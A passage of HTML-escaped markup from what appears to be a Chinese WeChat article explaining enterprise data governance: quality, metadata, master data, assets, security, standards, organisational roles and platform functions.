data-tool=&quot;mdnice编辑器&quot;&gt;如有遗漏之处，欢迎留言评论区探讨。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.29856115107913667&quot; data-type=&quot;png&quot; data-w=&quot;1390&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNh0oxd6LW4ibahfibx7nicBv4TV3NXHjsl93GMfX35kPIo9E8JJ6ITs2eA/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;1 数据治理到底是在做什么&lt;/span&gt;&lt;/h2&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;1.1  一个小故事&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在正文之前，我先介绍一个小故事。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;年底了，企业财务管理员小张需要统计公司的金融财务情况。忙碌了一年，公司老板亟需知道公司目前的运营状况。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;小张需要考虑哪几个点呢：&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;公司目前有哪些财产？&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;这些财产从哪里来？用到了哪些地方？&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;是否所有财产的使用均符合规范和制度？&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;幸好小张年初已经制定了一套管理标准。每笔财产的出入都有记录且严格把控使用情况，过程可追溯可审查。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;最后，小张得到了领导们的一致好评。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;1.2 数据治理做的事情&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;故事中的小张监管着公司所有金融财产活动，确保财产使用的有序高效。这也是数据治理角色的类似功能。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;&lt;strong&gt;数据治理的核心工作：&lt;/strong&gt;&lt;span&gt; 在企业的数据建设进程中，保障企业的数据资产得到正确有效&lt;/span&gt;地&lt;span&gt;管理。&lt;/span&gt;&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;一般来说，数据从外部或者内部产生后，经过大数据手段处理，流转到不同的业务端，为企业的上层应用提供数据赋能。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.38328530259365995&quot; data-type=&quot;png&quot; data-w=&quot;1041&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNxvqlHhOzosVJiccj94TyFiboq2tOCTLdicXpoExTnyz8jRVwN4xvNjBvw/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;整个过程，如图所示。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;我们先做一些类似数据同步的工作将数据放入到大数据系统中&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;数据进来后需要管理和存储，即参考建模理论和实际场景建设数仓&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;经过主题规划、维度确定、标签计算输出等步骤处理&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;数据输出到报表、应用端使用&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;整体流程数据治理体系将全程监管。要确认进出系统的&lt;code&gt;数据质量&lt;/code&gt;怎么样？是否可转化&lt;code&gt;数据资产&lt;/code&gt;？&lt;code&gt;数据血缘&lt;/code&gt;是否可追溯、&lt;code&gt;数据安全&lt;/code&gt;等问题。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;脏乱差的数据是无法使用的，甚至严重埋雷。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;2 为什么要做数据治理&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有一些企业对这个问题的概念很模糊，认为目前的数据规模很小，人为可控，暂时不需要做数据治理。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;但是在实际使用中还是会遇到很多问题：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;数据监管力度不够，出现脏数据&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;数据体系逐渐规模变大，管理混乱&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;数据的血缘丢失，无法回溯旧、老的数据&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;无论企业的数据规模如何，我认为还是提起做好数据治理的规划。考虑到成本的问题，可以分阶段进行。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;&lt;strong&gt;为什么要进行数据治理：&lt;/strong&gt;&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;你的数据是否真的可用，缺失和异常值怎么办？&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;数据从哪里来到哪里去，血缘信息是否丢失&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;数据访问是否安全，明文标识还是加密？&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;新的数据加工参考什么规范，维度和标签管理是否存在标准？&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;有剑在手不用和无剑可用是两回事&lt;/code&gt;。提前做好数据治理规划，会节省后续的改造成本，避免过程冗余重构或者推倒重来等情况的发生。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7075630252100841&quot; data-type=&quot;png&quot; data-w=&quot;595&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNlMncb3ItaybSSbuPiaQtlia3ot7pnhQ6qLuu9494Cx4oEvWZbMRoJqkg/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据治理可以有效保障数据建设过程在一个合理高效的监管体系下进行，最终提供&lt;code&gt;高质量&lt;/code&gt;、&lt;code&gt;安全&lt;/code&gt;、&lt;code&gt;流程可追溯&lt;/code&gt;的业务数据。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;3 数据治理体系&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;企业数据治理体系包括&lt;code&gt;数据质量管理&lt;/code&gt;、&lt;code&gt;元数据管理&lt;/code&gt;、&lt;code&gt;主数据管理&lt;/code&gt;、&lt;code&gt;数据资产管理&lt;/code&gt;、&lt;code&gt;数据安全&lt;/code&gt;及&lt;code&gt;数据标准&lt;/code&gt;等内容。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5592654424040067&quot; data-type=&quot;png&quot; data-w=&quot;1198&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNrpPzMKFWabscviboGHa98qO5KkgQHqWYTUwLj5yjwu3sZibH7MFr6vLg/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;1）数据质量&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;一般采用业内常用的标准来衡量数据质量的好坏：&lt;code&gt;完整性&lt;/code&gt;、&lt;code&gt;准确性&lt;/code&gt;、&lt;code&gt;一致性&lt;/code&gt;和&lt;code&gt;及时性&lt;/code&gt;。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;完整性：数据的记录和信息是否完整，是否存在缺失情况&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;准确性：数据汇总记录的信息和数据是否准确，是否存在异常或者错误&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;一致性：多个业务数仓间的公共数据，必须在各个数据仓库中保持一致&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;及时性：数据能及时产出和预警&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.4424552429667519&quot; data-type=&quot;png&quot; data-w=&quot;782&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNI0fofLxwlQ9BNBEOLT4GcrbCSuaAn6qDqjnLyJYmO1xxFiaJus1kriaw/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;2）元数据管理&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;元数据是关于数据的组织、数据域及其关系的信息，通俗理解，元数据就是描述数据的数据。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5949044585987261&quot; data-type=&quot;png&quot; data-w=&quot;785&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNZZciaDThP7fKYdkbPiavy9pibKwxZFrWfLGvUyF8VibNfpj9jew0ibHh3dg/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;元数据包含&lt;code&gt;技术元数据&lt;/code&gt;和&lt;code&gt;业务元数据&lt;/code&gt;。可以帮助数据分析人员清楚了解企业拥有什么数据，它们存储在哪里，如何抽取、清理、维护z这类数据，也即&lt;code&gt;数据血缘&lt;/code&gt;。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;帮助构建业务知识体系，确立数据业务含义可解释性&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;提升数据整合和溯源能力，血缘关系可维护&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;建立数据质量稽核体系，分类管理监控&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;3）主数据管理&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;企业主数据指企业内一致并共享的业务主体，大白话理解就是各专业公司和业务系统间共享的数据。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;常见的主数据比如公司的&lt;code&gt;员工&lt;/code&gt;、&lt;code&gt;客户数据&lt;/code&gt;、&lt;code&gt;机构信息&lt;/code&gt;、&lt;code&gt;供应商信息&lt;/code&gt;等。这些数据具有权威性和全局性，可归约至公司的企业资产。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;一般主数据管理需要遵循如下几点：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;管理和监管各组织机构、子公司、部门对主数据的访问，制定访问规范和管理原则&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;定期进行主数据评估，判断既定目标的完善程度&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;组织相关人员和机构，统一完善主数据建设&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;提供技术和业务流程支持，全集团集中统筹&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;4）数据资产管理&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;一般企业在数字化转型时都会考虑数据资产梳理。你的数据有没有被合理利用？如何产生最大价值？这是数据资产管理关心的核心工作。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在构建企业资产时一般会考虑不同角度，即业务角度和技术角度，最后进行合并，输出统一的&lt;code&gt;数据资产分析&lt;/code&gt;，并向外提供统一的数据资产查询服务。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.24672489082969432&quot; data-type=&quot;png&quot; data-w=&quot;916&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNSmqvYicepmMP7fUujbvIddaImfawkicUYOBg1ibnjTxHhLBgic2a53gMHw/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如何盘活数据，形成数据资产，提供完整的数据资产全景视图，可方便运营者全局、宏观地掌控企业资产动态。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;5）数据安全&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据安全是企业数据建设必不可少的一环，我们的数据都存储在大大小小的磁盘中，对外提供不同程度的查询和计算服务。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;需要定时对数据进行&lt;code&gt;核查&lt;/code&gt;、&lt;code&gt;敏感字段加密&lt;/code&gt;、&lt;code&gt;访问权限&lt;/code&gt;控制，确保数据能够被安全地使用。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;6）数据标准&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;大白话理解，我们需要在组织内定义一套关于数据的规范，好让我们都能理解这些数据的含义。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;今天张三说这个客户号是办理银行卡的客户，明天李四又说是借贷过的客户。对比一看，两者的字段类型和长度一致，到底要采纳哪个意见呢？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据标准是保障数据的内外部使用和交换的一致性和准确性的规范性约束，通过&lt;code&gt;统一规范&lt;/code&gt;，消除&lt;code&gt;二义性&lt;/code&gt;。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;4 企业数据治理实施过程&lt;/span&gt;&lt;/h2&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;4.1 数据治理实施框架&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据治理体系是为了规范业务数据规范、数据标准、数据质量和数据安全中的各类管理任务活动而建立的组织、流程与工具。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过一个常态化的数据治理组织，建立数据&lt;code&gt;集中管理&lt;/code&gt;长效机制，规范数据管控流程，提升数据质量，促进数据标准一致，保障数据共享与使用安全，从而提高企业运营效率和管理水平。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5693916349809885&quot; data-type=&quot;png&quot; data-w=&quot;1052&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgN7tdvic596sMaCIiaNP8fwzLxaQZDRfEbHHuykmLGP1xKFqz0QXcs2dVg/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;4.2 数据治理组织架构&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;企业数据治理体系除了在技术方面的&lt;code&gt;实施架构&lt;/code&gt;，还需要管理方面的&lt;code&gt;组织架构&lt;/code&gt;支撑。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;一般在数据治理建设初期，集团会先成立数据治理管理委员会。从上至下由&lt;code&gt;决策层&lt;/code&gt;、&lt;code&gt;管理层&lt;/code&gt;、&lt;code&gt;执行层&lt;/code&gt;构成。决策层决策、管理层制定方案、执行层实施。层级管理、统一协调。&lt;/p&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4.2.1 组织架构&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;1）决策层&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;提供数据标准管理的决策职能，通俗理解即拍板定方案。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;2）管理层&lt;/strong&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;审议数据标准管理相关制度&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;对跨部门难的数据标准管理争议事项进行讨论并决策&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;管理重大数据标准事项，提交信息科技管理委员会审议&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;3）执行层&lt;/strong&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;业务部门：负责业务线数据标准的制定、修改、复审，推广落实数据标准等&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;科技开发：承担治理平台、数据标准、数据质量等实施工作；系统设计和开发工作中遵循数据标准&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;科技运营：负责技术标准的制定和技术推广&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7669345579793341&quot; data-type=&quot;png&quot; data-w=&quot;871&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNpZYFzPElynsmg1h6iaVGe4VsTpZnRAPZhRwoGQ6ibYJMMtzcNaBza3CA/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4.2.2 管理层职责&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;1）项目经理&lt;/strong&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;确定项目目标、范围和计划&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;制定项目里程碑&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;管理跨项目协同&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;2）专家评审组&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;评审项目方案，确定方案的合理性&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;3）PMO&lt;/strong&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;确保项目按计划执行&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;管理项目重大风险&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;执行跨项目协同、沟通&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;组织项目关键评审&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;3）数据治理专项组&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;执行各项目的落地实施和运营推广，推动执行层的实施数据治理技术落地和项目进展。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.4255983350676379&quot; data-type=&quot;png&quot; data-w=&quot;961&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNh6x9ibueddtzjWVrEYNM49ouLayI4EfzyI34nbxG5PYQsDTKL7K8beQ/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4.2.3 执行层职责&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据架构师、数据治理专家和业务专员形成数据治理&quot;铁三角&quot;，紧密协作，推进数据治理与数据架构落地。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.46511627906976744&quot; data-type=&quot;png&quot; data-w=&quot;860&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgN0SUI6uiammt66eUqR0ZEkBdP3rIVaRdKVQXMpZabFXBJRMibibW51jg5g/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;1）业务专员&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;业务专员作为业务部门数据治理的接口人，在&lt;code&gt;标准&lt;/code&gt;、&lt;code&gt;质量&lt;/code&gt;、&lt;code&gt;应用&lt;/code&gt;等领域组织业务人员开展工作&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;2）数据治理专家&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据治理专家作为数据治理组成员，负责设计数据架构，运营数据资产；牵头组织业务、IT达成数据治理目标。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;3）数据架构师&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据架构师作为IT开发部门的专家，承担数据标准落地、模型落地的重任，协助解决数据质量问题。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;4.3 数据治理平台&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在确定了技术实施方案和组织管理架构，下面需要进行数据治理体系的落地实施。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在大型企业中一般会开发一个完整的&lt;code&gt;数据治理平台&lt;/code&gt;，囊括所有数据治理功能，对外提供平台服务。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;1）核心功能&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据治理平台作为数据治理的产品体系，旨在保障数据平台的数据是安全、可靠的、标准的、有价值的。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.40924092409240925&quot; data-type=&quot;png&quot; data-w=&quot;909&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNY9IrdiaZjUKyH0hlicRRPlzLoPHIkW351ZKtgNoiceSGicCqU4iaw34Azuw/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;数据资产管理&lt;/code&gt;：提供面向用户的场景化搜素，提供全景数据资产地图，方便快速查找资产和资产分析&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;数据标准管理&lt;/code&gt;：统一定制数据标准，提高包括字段、码值、数据字典管理，保障业务数据和中台数据的统一标准&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;数据质量监控&lt;/code&gt;：提供事前、事中、事后的数据质量体系，支持数据质量监控规则配置、告警管理等功能&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;数据安全&lt;/code&gt;：提供数据安全脱敏、安全分级和监控&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;code&gt;数据建模中心&lt;/code&gt;：统一建模，提供业务系统建模和模型管理&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;2）元数据管理&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;元数据管理系统作为数据治理平台的前端展示门户，帮助实现对数据资产的&lt;code&gt;快速检索&lt;/code&gt;能力，提高数据使用有效性和效率。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过建立完整且一致的元数据管理策略，提供集中、统一、规范的元数据信息访问、查询和调用功能。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.3097165991902834&quot; data-type=&quot;png&quot; data-w=&quot;1482&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgN2dRTrRn3xTRCJG2D4icYNE7arfHNu5WBOfhK7UFT2zKChszLN3rostg/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;3）数据质量&lt;/strong&gt;&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;数据质量监控：支持所有用户进行数据质量监控规则配置&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;规则阻断：配置数据质量监控阻断规则，数据质量出现差异可实时阻断下游作业运行，屏蔽错误结果链路扩散。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;告警：数据质量出现预设偏差，及时发出预警通知及时修复&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5091240875912408&quot; data-type=&quot;png&quot; data-w=&quot;548&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNDU2cyP7wWqcuwicgZ5ttleE7IFNW7W9YNHuHO7ajBBpqgKNQdUvfFzw/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;4）数据标准&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;支持定制统一的数据标准平台，包括字段标准管理，码值标准管理以及字典管理，业务源数据和中台数据统一标准。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.3850129198966408&quot; data-type=&quot;png&quot; data-w=&quot;774&quot; 